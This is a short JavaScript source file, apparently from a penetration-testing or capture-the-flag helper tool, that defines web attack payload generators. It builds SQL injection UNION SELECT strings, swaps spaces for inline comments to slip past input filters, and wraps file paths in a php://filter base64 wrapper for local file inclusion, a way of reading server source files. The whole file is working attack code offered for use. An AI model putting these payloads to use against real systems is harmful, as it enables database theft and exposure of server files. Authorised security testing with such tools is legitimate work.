var Payload = {}

Payload.SQLi = class {
  static unionSelect (value) {
    value = parseInt(value)
    if (isNaN(value) === true) {
      return ''
    }

    return 'union select ' +
      Array.from(Array(value + 1).keys()).slice(1).join(',')
  }

  static spaceToComment (value) {
    return value.replace(/[^\S\r\n]+/g, '/**/')
  }
}

Payload.LFI = class {
  static phpWrapperBas64 (value) {
    return 'php://filter/convert.base64-encode/resource=' + value
  }
}
